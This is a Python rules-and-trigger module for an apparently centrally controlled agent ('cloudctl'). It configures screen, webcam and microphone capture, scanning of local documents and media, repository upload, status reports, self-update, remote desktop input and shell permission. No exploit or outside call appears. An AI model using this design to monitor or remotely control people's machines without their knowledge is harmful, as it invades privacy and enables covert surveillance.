"""规则引擎：规则合并、以及遥控制策略。

规则来源：中心服务端或仓库文件，本地缓存在 rules.json，断网时继续沿用缓存执行。
段落：capture（photo / video / camera / audio / slideshow）、scan、upload（含 chunk）、
index、report（存活与关机上报）、update（OTA）。
"""
from __future__ import annotations

import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any

from .util import in_time_window, read_json, title_match_any, write_json

DEFAULT_RULES: dict[str, Any] = {
    "version": 0,
    "identity": {"display_name": "", "tags": []},
    "capture": {
        "photo": {
            "enabled": False,
            "device": "cam0",
            "min_interval_s": 600,
            "max_per_day": 50,
            "active_hours": None,
            "settle_s": 3,
            "when": {
                "only_if_idle_s": 0,
                "on_foreground_change": True,
                "on_session_unlock": False,
            },
        },
        "video": {
            "enabled": False,
            "segment_s": 60,
            "fps": 5,
            "quality": 60,
            "monitor": 0,
            "max_mb_per_day": 500,
            "active_hours": None,
            "settle_s": 5,
            "cooldown_s": 10,
            "when": {
                "on_foreground_change": True,
                "on_slideshow": True,
                "idle_skip": True,
                "idle_skip_s": 300,
                "exclude_titles": [],
            },
        },
        "camera": {
            "enabled": False,
            "index": 0,
            "fps": 15,
            "width": 1280,
            "height": 720,
            "quality": 70,
            "segment_s": 120,
            "min_segment_s": 5,
            "max_mb_per_day": 2000,
            "active_hours": None,
            "cooldown_s": 30,
            "audio_track": False,
        },
        "audio": {
            "enabled": False,
            "device": -1,
            "sample_rate": 16000,
            "block_ms": 100,
            "threshold_db": -35.0,
            "attack_s": 0.3,
            "hold_s": 3.0,
            "save_audio": False,
            "max_mb_per_day": 2000,
            "active_hours": None,
            "cooldown_s": 10,
        },
        "slideshow": {
            "enabled": True,
            "titles": ["PowerPoint 幻灯片放映", "Slide Show", "Presentation"],
            "threshold": 12,
            "cooldown_s": 8,
            "poll_s": 4,
        },
    },
    "scan": {
        "roots": [],
        "interval_min": 30,
        "follow_links": False,
        "max_file_mb": 4096,
        "types": {
            "doc": ["ppt", "pptx", "doc", "docx", "pdf", "xls", "xlsx", "md", "txt"],
            "image": ["jpg", "jpeg", "png", "webp", "gif", "bmp", "heic"],
            "audio": ["mp3", "wav", "flac", "m4a", "aac", "ogg"],
            "video": ["mp4", "mov", "mkv", "avi", "webm"],
        },
        "exclude_globs": [
            "*/node_modules/*",
            "*/.git/*",
            "*/AppData/Local/Temp/*",
            "*/Windows/*",
            "*/$Recycle.Bin/*",
            "*/captures/*",
        ],
    },
    "upload": {
        "enabled": False,
        "repo": "",
        "branch": "main",
        "path_prefix": "kb",
        "layout": "{prefix}/{type}/{yyyy}/{mm}/{name}",
        "dedup": "sha256",
        "max_single_mb": 90,
        "concurrency": 2,
        "chunk": {
            "enabled": True,
            "size_mb": 40,
            "keep_parts": True,
        },
    },
    "index": {
        "enabled": True,
        "repo": "",
        "branch": "",
        "path": "kb/_index/index.json",
        "per_kind": True,
        "dedup": "sha256",
        "include_chunks": True,
        "max_entries": 20000,
    },
    "report": {
        "enabled": True,
        "interval_s": 300,
        "on_start": True,
        "on_shutdown": True,
        "shutdown_wait_s": 8,
        "include_metrics": True,
    },
    "p2p": {
        "enabled": True,
        "keepalive_s": 20,
        "inbox_max_mb": 4096,
    },
    "storage": {
        "buffer_max_mb": 10240,
        "min_free_mb": 20480,
        "drop_oldest": True,
        "log_max_mb": 5,
        "log_keep": 3,
    },
    "update": {
        "enabled": False,
        "repo": "happy-everyday-everyweek/cloudctl",
        "channel": "latest",
        "tag": "",
        "asset_pattern": "cloudctl-agent",
        "check_min": 60,
        "verify_sha": True,
        "auto_apply": False,
        "keep_backup": True,
        "restart_delay_s": 5,
    },
    "desktop": {"max_fps": 10, "allow_input": True, "monitors": 1, "quality": 60},
    "security": {"allow_shell": True, "allow_file_write": True, "allow_delete": False},
}


def deep_merge(base: dict, override: dict) -> dict:
    out = dict(base)
    for k, v in (override or {}).items():
        if isinstance(v, dict) and isinstance(out.get(k), dict):
            out[k] = deep_merge(out[k], v)
        else:
            out[k] = v
    return out


class RuleSet:
    def __init__(self, data: dict[str, Any] | None = None) -> None:
        self.data = deep_merge(DEFAULT_RULES, data or {})

    @property
    def version(self) -> int:
        return int(self.data.get("version") or 0)

    @property
    def photo(self) -> dict:
        return self.data["capture"]["photo"]

    @property
    def video(self) -> dict:
        return self.data["capture"]["video"]

    @property
    def camera(self) -> dict:
        return self.data["capture"]["camera"]

    @property
    def audio(self) -> dict:
        return self.data["capture"]["audio"]

    @property
    def slideshow(self) -> dict:
        return self.data["capture"]["slideshow"]

    @property
    def scan(self) -> dict:
        return self.data["scan"]

    @property
    def upload(self) -> dict:
        return self.data["upload"]

    @property
    def chunk(self) -> dict:
        return self.data["upload"]["chunk"]

    @property
    def index(self) -> dict:
        return self.data["index"]

    @property
    def report(self) -> dict:
        return self.data["report"]

    @property
    def p2p(self) -> dict:
        return self.data["p2p"]

    @property
    def storage(self) -> dict:
        return self.data["storage"]

    @property
    def update(self) -> dict:
        return self.data["update"]

    @property
    def desktop(self) -> dict:
        return self.data["desktop"]

    @property
    def security(self) -> dict:
        return self.data["security"]

    def ext_map(self) -> dict[str, str]:
        out: dict[str, str] = {}
        for kind, exts in (self.data["scan"].get("types") or {}).items():
            for e in exts:
                out[str(e).lower().lstrip(".")] = kind
        return out

    @classmethod
    def load(cls, path: Path) -> "RuleSet":
        return cls(read_json(path, {}) or {})

    def save(self, path: Path) -> None:
        write_json(path, self.data)

    def merge(self, incoming: dict[str, Any], version: int = 0) -> bool:
        new_ver = int(version or (incoming or {}).get("version") or 0)
        if new_ver and new_ver <= self.version:
            return False
        self.data = deep_merge(self.data, incoming or {})
        if new_ver:
            self.data["version"] = new_ver
        return True


@dataclass
class TriggerState:
    day: str = ""
    photo_count: int = 0
    video_mb: float = 0.0
    camera_mb: float = 0.0
    last_photo_ts: float = 0.0
    last_video_start_ts: float = 0.0
    last_camera_start_ts: float = 0.0
    last_audio_start_ts: float = 0.0
    last_slide_ts: float = 0.0
    last_title: str = ""
    title_seen_ts: float = 0.0
    last_reason: str = ""
    errors: list[str] = field(default_factory=list)


class TriggerEngine:
    """把“什么时候拍、什么时候录”收敛到一个地方，并统计配额。"""

    def __init__(self, rules: RuleSet) -> None:
        self.rules = rules
        self.state = TriggerState(day=datetime.now().strftime("%Y-%m-%d"))
        self.video_running = False

    def reload(self, rules: RuleSet) -> None:
        self.rules = rules

    # --- 统计 ---
    def _roll_day(self) -> None:
        today = datetime.now().strftime("%Y-%m-%d")
        if today != self.state.day:
            self.state.day = today
            self.state.photo_count = 0
            self.state.video_mb = 0.0
            self.state.camera_mb = 0.0

    def note_photo(self) -> None:
        self._roll_day()
        self.state.photo_count += 1
        self.state.last_photo_ts = time.time()

    def note_video_bytes(self, nbytes: int) -> None:
        self._roll_day()
        self.state.video_mb += nbytes / (1024 * 1024)

    def note_camera_bytes(self, nbytes: int) -> None:
        self._roll_day()
        self.state.camera_mb += nbytes / (1024 * 1024)

    def note_video_start(self) -> None:
        self.state.last_video_start_ts = time.time()
        self.video_running = True

    def note_video_stop(self) -> None:
        self.video_running = False

    def note_slide(self) -> None:
        self.state.last_slide_ts = time.time()

    # --- 摄像头 / 声控 ---
    def camera_allowed(self) -> tuple[bool, str]:
        self._roll_day()
        cm, au = self.rules.camera, self.rules.audio
        if not cm.get("enabled"):
            return False, "disabled"
        if not in_time_window(cm.get("active_hours")):
            return False, "outside_active_hours"
        if self.state.camera_mb >= float(cm.get("max_mb_per_day") or 1e9):
            return False, "daily_quota"
        if (time.time() - self.state.last_camera_start_ts) < float(cm.get("cooldown_s") or 0):
            return False, "cooldown"
        if au.get("enabled") and not in_time_window(au.get("active_hours")):
            return False, "audio_outside_active_hours"
        return True, "ok"

    def note_camera_start(self) -> None:
        self.state.last_camera_start_ts = time.time()

    def note_audio_start(self) -> None:
        self.state.last_audio_start_ts = time.time()

    # --- 幻灯片翻页判定 ---
    def slideshow_due(self) -> bool:
        """距上次因翻页而开录已过冷却；冷却在真正开录时才刷新。"""
        sl = self.rules.slideshow
        if not sl.get("enabled"):
            return False
        return (time.time() - self.state.last_slide_ts) >= float(sl.get("cooldown_s") or 0)

    # --- 录屏判定 ---
    def decide(self, fg_title: str, idle_s: float, locked: bool = False,
               slide_changed: bool = False) -> dict[str, Any]:
        self._roll_day()
        now = time.time()
        ph, vd = self.rules.photo, self.rules.video
        out: dict[str, Any] = {"photo": False, "video_start": False, "video_stop": False, "reason": ""}

        if fg_title and fg_title != self.state.last_title:
            self.state.last_title = fg_title
            self.state.title_seen_ts = now
        title_stable_s = now - self.state.title_seen_ts

        # ---- 停止判定 ----
        if self.video_running:
            stop_reason = ""
            if locked:
                stop_reason = "session_locked"
            elif not vd.get("enabled"):
                stop_reason = "disabled"
            elif not in_time_window(vd.get("active_hours")):
                stop_reason = "outside_active_hours"
            elif self.state.video_mb >= float(vd.get("max_mb_per_day") or 1e9):
                stop_reason = "daily_quota"
            elif title_match_any(fg_title, vd["when"].get("exclude_titles") or []):
                stop_reason = "excluded_title"
            elif vd["when"].get("idle_skip") and idle_s >= float(vd["when"].get("idle_skip_s") or 300):
                stop_reason = "idle"
            if stop_reason:
                out["video_stop"] = True
                out["reason"] = stop_reason
                self.state.last_reason = stop_reason
                return out

        # ---- 录屏启动判定 ----
        if vd.get("enabled") and not self.video_running and not locked:
            ok = in_time_window(vd.get("active_hours"))
            ok = ok and self.state.video_mb < float(vd.get("max_mb_per_day") or 1e9)
            ok = ok and not title_match_any(fg_title, vd["when"].get("exclude_titles") or [])
            ok = ok and (now - self.state.last_video_start_ts) >= float(vd.get("cooldown_s") or 0)
            if slide_changed and vd["when"].get("on_slideshow") and self.slideshow_due():
                self.state.last_slide_ts = now
                out["video_start"] = True
                out["reason"] = "slideshow"
                self.state.last_reason = out["reason"]
                return out
            triggered, why = self._interest_trigger(vd["when"], title_stable_s, float(vd.get("settle_s") or 0))
            if ok and triggered:
                out["video_start"] = True
                out["reason"] = why or "interval"
                self.state.last_reason = out["reason"]
                return out

        # ---- 拍照判定 ----
        if ph.get("enabled") and not locked:
            ok = self.state.photo_count < int(ph.get("max_per_day") or 0)
            ok = ok and in_time_window(ph.get("active_hours"))
            ok = ok and (now - self.state.last_photo_ts) >= float(ph.get("min_interval_s") or 0)
            ok = ok and idle_s >= float(ph["when"].get("only_if_idle_s") or 0)
            ok = ok and title_stable_s >= float(ph.get("settle_s") or 0)
            out["photo"] = bool(ok)
            if ok:
                self.state.last_reason = "photo:interval"
        return out

    def _interest_trigger(self, when: dict, title_stable_s: float, settle_s: float) -> tuple[bool, str]:
        want_change = bool(when.get("on_foreground_change"))
        want_slideshow = bool(when.get("on_slideshow"))
        if not want_change and not want_slideshow:
            return True, "interval"
        if title_stable_s < settle_s:
            return False, "settling"
        return True, "foreground_ready"
